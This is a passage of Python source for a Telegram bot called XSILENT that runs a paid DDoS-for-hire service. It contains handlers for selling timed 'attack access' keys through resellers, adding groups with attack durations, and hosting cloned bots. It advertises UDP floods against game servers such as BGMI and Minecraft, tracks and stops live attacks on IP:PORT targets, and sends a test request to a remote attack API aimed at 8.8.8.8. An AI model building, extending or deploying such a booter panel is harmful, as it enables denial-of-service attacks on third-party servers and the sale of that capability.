        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, "⚠️ **Usage:** `/host BOT_TOKEN USER_ID CONCURRENT OWNER_NAME`\n📌 **Concurrent:** `1-100`\n📌 **Example:** `/host 123456:ABC 8487946379 10 XSILENT`", parse_mode='Markdown')
        return
    
    bot_token = args[1]
    owner_id = args[2]
    try:
        concurrent = int(args[3])
        if concurrent < 1 or concurrent > 100:
            bot.reply_to(msg, "❌ **Concurrent must be between 1 and 100!**", parse_mode='Markdown')
            return
    except:
        bot.reply_to(msg, "❌ **Invalid concurrent value!**", parse_mode='Markdown')
        return
    
    owner_name = args[4]
    
    save_hosted_bot(bot_token, owner_id, owner_name, concurrent)
    hosted_bots[bot_token] = {
        "owner_id": owner_id,
        "owner_name": owner_name,
        "concurrent": concurrent,
        "active_attacks": {},
        "users": [],
        "resellers": []
    }
    
    if start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
        bot.reply_to(msg, f"✅ **HOSTED BOT STARTED!**\n\n🔑 **Token:** `{bot_token[:20]}...`\n👑 **Owner:** `{owner_id}`\n📛 **Name:** `{owner_name}`\n⚡ **Concurrent:** `{concurrent}`\n⏳ **Cooldown:** `{COOLDOWN_TIME}s`\n\n💡 Bot is now live!", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "❌ **Failed to start hosted bot!**\nCheck token and try again.", parse_mode='Markdown')

@bot.message_handler(commands=['unhost'])
def unhost_bot(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/unhost BOT_TOKEN`", parse_mode='Markdown')
        return
    
    bot_token = args[1]
    
    if bot_token in hosted_bots:
        del hosted_bots[bot_token]
        remove_hosted_bot(bot_token)
        bot.reply_to(msg, f"✅ **HOSTED BOT REMOVED!**\n\n🔑 **Token:** `{bot_token[:20]}...`", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "❌ **Hosted bot not found!**", parse_mode='Markdown')

@bot.message_handler(commands=['allhosts'])
def all_hosts(msg):
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    host_list = []
    for token, info in hosted_bots.items():
        host_list.append(f"🔑 `{token[:20]}...`\n└ 👑 Owner: `{info['owner_id']}`\n└ 📛 Name: `{info['owner_name']}`\n└ ⚡ Concurrent: `{info['concurrent']}`")
    
    if host_list:
        bot.reply_to(msg, f"📋 **ALL HOSTED BOTS:**\n\n" + "\n\n".join(host_list) + f"\n\n📊 **Total:** `{len(hosted_bots)}`", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "📋 **No hosted bots found!**", parse_mode='Markdown')

@bot.message_handler(commands=['maintenance'])
def maintenance(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/maintenance on` or `/maintenance off`", parse_mode='Markdown')
        return
    
    global maintenance_mode
    status = args[1].lower()
    
    if status == "on":
        maintenance_mode = True
        bot.reply_to(msg, "🔧 **MAINTENANCE MODE ENABLED** 🔧\n\nBot commands are now disabled.\nUse `/maintenance off` to disable.", parse_mode='Markdown')
    elif status == "off":
        maintenance_mode = False
        bot.reply_to(msg, "✅ **MAINTENANCE MODE DISABLED** ✅\n\nBot is now fully operational!", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "❌ **Invalid status!** Use `on` or `off`", parse_mode='Markdown')

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ **Admin or Reseller only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/genkey 1` (1 day) or `/genkey 5h` (5 hours)", parse_mode='Markdown')
        return
    
    duration_str = args[1]
    
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, "❌ **Invalid duration!**\nUse: `1` (1 day) or `5h` (5 hours)", parse_mode='Markdown')
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    
    keys_data[key] = {
        "user_id": "pending",
        "duration_value": value,
        "duration_unit": unit,
        "generated_by": uid,
        "generated_at": time.time(),
        "expires_at": expires_at.timestamp(),
        "used": False
    }
    save_keys(keys_data)
    
    expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(value, unit)
    
    bot.reply_to(msg, f"✅ **KEY GENERATED!**\n\n🔑 **Key:** `{key}`\n⏰ **Duration:** {duration_display}\n📅 **Expires:** `{expiry_str}`\n\n📌 Share this key with user!\n👤 **User:** `/redeem {key}`", parse_mode='Markdown')

@bot.message_handler(commands=['removekey'])
def remove_key(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/removekey KEY`", parse_mode='Markdown')
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ **Key not found!**", parse_mode='Markdown')
        return
    
    del keys_data[key]
    save_keys(keys_data)
    
    bot.reply_to(msg, f"✅ **KEY REMOVED!**\n🔑 **Key:** `{key}`", parse_mode='Markdown')

@bot.message_handler(commands=['add'])
def add_user(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/add USER_ID`", parse_mode='Markdown')
        return
    
    new_user = args[1]
    
    if new_user in ADMIN_ID:
        bot.reply_to(msg, "❌ **Cannot add owner!**", parse_mode='Markdown')
        return
    
    if new_user in users:
        bot.reply_to(msg, f"❌ **User `{new_user}` already has access!**", parse_mode='Markdown')
        return
    
    users.append(new_user)
    users_data["users"] = users
    save_users(users_data)
    
    bot.reply_to(msg, f"✅ **USER ADDED!**\n\n👤 **User:** `{new_user}`\n✅ Now has attack access!", parse_mode='Markdown')
    
    try:
        bot.send_message(new_user, "✅ **You have been granted attack access!**\nUse `/start` to see commands")
    except:
        pass

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/remove USER_ID`", parse_mode='Markdown')
        return
    
    target_user = args[1]
    
    if target_user in ADMIN_ID:
        bot.reply_to(msg, "❌ **Cannot remove owner!**", parse_mode='Markdown')
        return
    
    if target_user not in users:
        bot.reply_to(msg, f"❌ **User `{target_user}` not found!**", parse_mode='Markdown')
        return
    
    remove_user_from_system(target_user)
    
    bot.reply_to(msg, f"✅ **USER REMOVED!**\n\n👤 **User:** `{target_user}`\n❌ Attack access revoked!", parse_mode='Markdown')
    
    try:
        bot.send_message(target_user, "⚠️ **Your attack access has been revoked by owner!**")
    except:
        pass

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/addreseller USER_ID`", parse_mode='Markdown')
        return
    
    new_reseller = args[1]
    
    if new_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ **Cannot add owner as reseller!**", parse_mode='Markdown')
        return
    
    if new_reseller in resellers:
        bot.reply_to(msg, f"❌ **User `{new_reseller}` is already a reseller!**", parse_mode='Markdown')
        return
    
    resellers.append(new_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    if new_reseller not in users:
        users.append(new_reseller)
        users_data["users"] = users
        save_users(users_data)
    
    bot.reply_to(msg, f"✅ **RESELLER ADDED!**\n\n👤 **Reseller:** `{new_reseller}`\n🔑 Can now generate keys using `/genkey`", parse_mode='Markdown')
    
    try:
        bot.send_message(new_reseller, "✅ **You have been added as RESELLER!**\nYou can now generate keys using `/genkey`")
    except:
        pass

@bot.message_handler(commands=['removereseller'])
def remove_reseller(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/removereseller USER_ID`", parse_mode='Markdown')
        return
    
    target_reseller = args[1]
    
    if target_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ **Cannot remove owner!**", parse_mode='Markdown')
        return
    
    if target_reseller not in resellers:
        bot.reply_to(msg, f"❌ **User `{target_reseller}` is not a reseller!**", parse_mode='Markdown')
        return
    
    resellers.remove(target_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    bot.reply_to(msg, f"✅ **RESELLER REMOVED!**\n\n👤 **User:** `{target_reseller}`\n❌ Can no longer generate keys", parse_mode='Markdown')
    
    try:
        bot.send_message(target_reseller, "⚠️ **Your reseller privileges have been removed!**")
    except:
        pass

@bot.message_handler(commands=['addgroup'])
def add_group(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, "⚠️ **Usage:** `/addgroup GROUP_ID TIME`\n📌 **Example:** `/addgroup -100123456789 60`", parse_mode='Markdown')
        return
    
    group_id = args[1]
    try:
        attack_time = int(args[2])
    except:
        bot.reply_to(msg, "❌ **Invalid time!**", parse_mode='Markdown')
        return
    
    if attack_time < 10 or attack_time > 300:
        bot.reply_to(msg, "❌ **Attack time must be between 10-300 seconds!**", parse_mode='Markdown')
        return
    
    save_group(group_id, attack_time, uid)
    bot.reply_to(msg, f"✅ **GROUP ADDED!**\n\n👥 **Group ID:** `{group_id}`\n⏱️ **Attack Time:** `{attack_time}s`", parse_mode='Markdown')

@bot.message_handler(commands=['removegroup'])
def remove_group_cmd(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/removegroup GROUP_ID`", parse_mode='Markdown')
        return
    
    group_id = args[1]
    remove_group(group_id)
    bot.reply_to(msg, f"✅ **GROUP REMOVED!**\n👥 **Group ID:** `{group_id}`", parse_mode='Markdown')

@bot.message_handler(commands=['allgroups'])
def all_groups(msg):
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    group_list = []
    for group_id, info in groups.items():
        group_list.append(f"👥 `{group_id}`\n└ ⏱️ `{info['attack_time']}s`\n└ 👑 `{info['added_by']}`")
    
    if group_list:
        bot.reply_to(msg, f"📋 **ALL GROUPS:**\n\n" + "\n\n".join(group_list) + f"\n\n📊 **Total:** `{len(groups)}`", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "📋 **No groups added yet!**", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def redeem(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/redeem KEY`", parse_mode='Markdown')
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ **Invalid key!**", parse_mode='Markdown')
        return
    
    key_info = keys_data[key]
    
    if key_info.get("used", False):
        bot.reply_to(msg, "❌ **Key already used!**", parse_mode='Markdown')
        return
    
    if time.time() > key_info["expires_at"]:
        bot.reply_to(msg, "❌ **Key expired!**", parse_mode='Markdown')
        del keys_data[key]
        save_keys(keys_data)
        return
    
    if uid not in users:
        users.append(uid)
    
    users_data["users"] = users
    save_users(users_data)
    
    keys_data[key]["used"] = True
    keys_data[key]["used_at"] = time.time()
    keys_data[key]["used_by"] = uid
    save_keys(keys_data)
    
    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
    
    bot.reply_to(msg, f"✅ **ACCESS GRANTED!**\n\n🎉 User `{uid}` activated!\n⏰ **Duration:** {duration_display}\n📅 **Expires:** `{expiry_str}`\n⚡ **Total Concurrent:** `{MAX_CONCURRENT}`\n⏳ **Cooldown:** `{COOLDOWN_TIME}s`\n\n🛒 **Buy:** XSILENT", parse_mode='Markdown')

@bot.message_handler(commands=['mykeys'])
def mykeys(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ **Unauthorized!**", parse_mode='Markdown')
        return
    
    my_generated_keys = []
    for key, info in keys_data.items():
        if info.get("generated_by") == uid and not info.get("used", False):
            expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
            duration_display = format_duration(info['duration_value'], info['duration_unit'])
            my_generated_keys.append(f"🔑 `{key}`\n   ⏰ {duration_display}\n   📅 Expires: `{expires}`")
    
    if my_generated_keys:
        bot.reply_to(msg, f"📋 **YOUR GENERATED KEYS:**\n\n" + "\n\n".join(my_generated_keys), parse_mode='Markdown')
    else:
        bot.reply_to(msg, f"📋 **No keys generated yet!**\n\n🛒 Buy: XSILENT", parse_mode='Markdown')

@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    # Check if message has photo or video
    if msg.reply_to_message:
        # Broadcast with media
        all_chat_users = []
        for user in users:
            all_chat_users.append(user)
        
        success_count = 0
        fail_count = 0
        
        for user in all_chat_users:
            try:
                if msg.reply_to_message.photo:
                    bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, caption=msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else "")
                elif msg.reply_to_message.video:
                    bot.send_video(user, msg.reply_to_message.video.file_id, caption=msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else "")
                else:
                    bot.send_message(user, msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else "📢 Broadcast Message")
                success_count += 1
            except:
                fail_count += 1
        
        bot.reply_to(msg, f"✅ **BROADCAST SENT!**\n✅ **Success:** `{success_count}` users\n❌ **Failed:** `{fail_count}` users", parse_mode='Markdown')
    else:
        # Broadcast text only
        args = msg.text.split(maxsplit=1)
        if len(args) != 2:
            bot.reply_to(msg, "⚠️ **Usage:** `/broadcast MESSAGE`\n💡 **Or reply to a photo/video with caption**", parse_mode='Markdown')
            return
        
        message = args[1]
        
        all_chat_users = []
        for user in users:
            all_chat_users.append(user)
        
        success_count = 0
        fail_count = 0
        
        for user in all_chat_users:
            try:
                bot.send_message(user, f"📢 **BROADCAST MESSAGE** 📢\n\n{message}\n\n🛒 **Buy:** XSILENT", parse_mode='Markdown')
                success_count += 1
            except:
                fail_count += 1
        
        bot.reply_to(msg, f"✅ **BROADCAST SENT!**\n✅ **Success:** `{success_count}` users\n❌ **Failed:** `{fail_count}` users", parse_mode='Markdown')

@bot.message_handler(commands=['stopattack'])
def stop_attack(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "⚠️ **Usage:** `/stopattack IP:PORT`", parse_mode='Markdown')
        return
    
    target = args[1]
    
    stopped = False
    for attack_id, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[attack_id]
            stopped = True
            bot.reply_to(msg, f"✅ **ATTACK STOPPED!**\n🎯 **Target:** `{target}`\n👤 **Attacker:** `{info['user']}`", parse_mode='Markdown')
            try:
                bot.send_message(info['user'], f"⚠️ Your attack on `{target}` was stopped by owner!", parse_mode='Markdown')
            except:
                pass
            break
    
    if not stopped:
        bot.reply_to(msg, f"❌ **No active attack found on `{target}`**", parse_mode='Markdown')

@bot.message_handler(commands=['methods'])
def methods(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if chat_type == "group" or chat_type == "supergroup":
        bot.reply_to(msg, f"⚡ **UDP AUTO ATTACK**\n\n💡 Best for gaming\n🎯 **Recommended ports:** `443`, `8080`\n\n📌 **USAGE:**\n`/attack IP PORT`", parse_mode='Markdown')
    elif uid in users or uid in ADMIN_ID or uid in resellers:
        bot.reply_to(msg, f"⚡ **UDP AUTO ATTACK**\n\n💡 Best for gaming (BGMI, Minecraft)\n🎯 **Recommended ports:** `443`, `8080`, `14000`\n\n📌 **USAGE:**\n`/attack IP PORT TIME`\n\n📌 **Example:** `/attack 1.1.1.1 443 60`\n\n🛒 **Buy:** XSILENT", parse_mode='Markdown')
    else:
        bot.reply_to(msg, "❌ **Unauthorized!**", parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def stats(msg):
    uid = str(msg.chat.id)
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ **Unauthorized!**", parse_mode='Markdown')
        return
    
    has_active = check_user_expiry(uid)
    status_text = "Active" if has_active else "Expired"
    cooldown_text = "Yes" if uid in cooldown else "No"
    if uid in cooldown:
        remaining = COOLDOWN_TIME - (time.time() - cooldown[uid])
        if remaining > 0:
            cooldown_text = f"{int(remaining)}s left"
    
    bot.reply_to(msg, f"📊 **YOUR STATS**\n\n👤 **ID:** `{uid}`\n✅ **Status:** `{status_text}`\n⏳ **Cooldown:** `{cooldown_text}`\n\n🛒 **Buy:** XSILENT", parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if chat_type == "group" or chat_type == "supergroup":
        bot.reply_to(msg, f"✨ **XSILENT GROUP HELP** ✨\n\n📝 **COMMANDS:**\n`/attack IP PORT` - Launch attack\n`/help` - This menu\n`/start` - Bot info", parse_mode='Markdown')
    elif uid in ADMIN_ID:
        bot.reply_to(msg, f"👑 **XSILENT OWNER HELP** 👑\n\n📝 **COMMANDS:**\n\n`/attack IP PORT TIME` - Launch attack\n`/status` - Check slots\n`/cooldown` - Check your cooldown\n`/setmax 1-100` - Set concurrent limit\n`/setcooldown 1-300` - Set cooldown time\n`/genkey 1 or 5h` - Generate key\n`/removekey KEY` - Remove key\n`/add USER` - Add user\n`/remove USER` - Remove user\n`/addreseller USER` - Add reseller\n`/removereseller USER` - Remove reseller\n`/addgroup GROUP_ID TIME` - Add group\n`/removegroup GROUP_ID` - Remove group\n`/host BOT_TOKEN USER_ID CONCURRENT NAME` - Host bot\n`/unhost BOT_TOKEN` - Remove hosted bot\n`/maintenance on/off` - Maintenance mode\n`/broadcast MSG` - Broadcast (text/photo/video)\n`/stopattack IP:PORT` - Stop attack\n`/allusers` - List users\n`/allgroups` - List groups\n`/allhosts` - List hosted bots\n`/api_status` - API status\n\n⚡ **Concurrent:** `{MAX_CONCURRENT}`\n⏳ **Cooldown:** `{COOLDOWN_TIME}s`\n🛒 **Buy:** XSILENT", parse_mode='Markdown')
    elif uid in resellers:
        bot.reply_to(msg, f"💎 **XSILENT RESELLER HELP** 💎\n\n📝 **COMMANDS:**\n\n`/attack IP PORT TIME` - Launch attack\n`/status` - Check slots\n`/cooldown` - Check your cooldown\n`/genkey 1 or 5h` - Generate key\n`/mykeys` - Your keys\n\n⚡ **Concurrent:** `{MAX_CONCURRENT}`\n⏳ **Cooldown:** `{COOLDOWN_TIME}s`\n🛒 **Buy:** XSILENT", parse_mode='Markdown')
    elif uid in users:
        bot.reply_to(msg, f"🔥 **XSILENT USER HELP** 🔥\n\n📝 **COMMANDS:**\n\n`/attack IP PORT TIME` - Launch attack\n`/status` - Check slots\n`/cooldown` - Check your cooldown\n`/redeem KEY` - Activate key\n\n⚡ **Concurrent:** `{MAX_CONCURRENT}`\n⏳ **Cooldown:** `{COOLDOWN_TIME}s`\n🛒 **Buy:** XSILENT", parse_mode='Markdown')
    else:
        bot.reply_to(msg, f"❌ **Unauthorized!**\n\nUse `/redeem KEY` to activate\n\n🛒 **Buy:** XSILENT", parse_mode='Markdown')

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    user_list = []
    for u in users:
        if u in ADMIN_ID:
            role = "👑 OWNER"
        elif u in resellers:
            role = "💎 RESELLER"
        else:
            role = "👤 USER"
        user_list.append(f"{role}: `{u}`")
    
    bot.reply_to(msg, f"📋 **ALL USERS:**\n\n" + "\n".join(user_list) + f"\n\n📊 **Total:** `{len(users)}`", parse_mode='Markdown')

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if check_maintenance():
        bot.reply_to(msg, maintenance_message, parse_mode='Markdown')
        return
    
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ **Owner only!**", parse_mode='Markdown')
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
        api_status_text = "Online" if test_response.status_code == 200 else "Offline"
        bot.reply_to(msg, f"✅ **API STATUS**\n\n📡 **Status:** `{api_status_text}`\n🎯 **Active Attacks:** `{len(active_attacks)}`", parse_mode='Markdown')
    except:
        bot.reply_to(msg, "❌ **API OFFLINE**", parse_mode='Markdown')

def cleanup_attacks():
    while True:
        time.sleep(5)
        now = time.time()
        
        for attack_id, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[attack_id]
        
        for key, info in list(keys_data.items()):
            if info.get("used", False) and now > info["expires_at"]:
                user_id = info.get("used_by")
                if user_id and user_id in users and user_id not in ADMIN_ID:
                    users.remove(user_id)
                    users_data["users"] = users
                    save_users(users_data)

cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
cleanup_thread.start()

print("✨ XSILENT BOT STARTED ✨")
print("👑 Owner: 8487946379")
print(f"⚡ Max Concurrent: {MAX_CONCURRENT}")
print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
print(f"📊 Hosted Bots: {len(hosted_bots)}")

bot.infinity_polling()
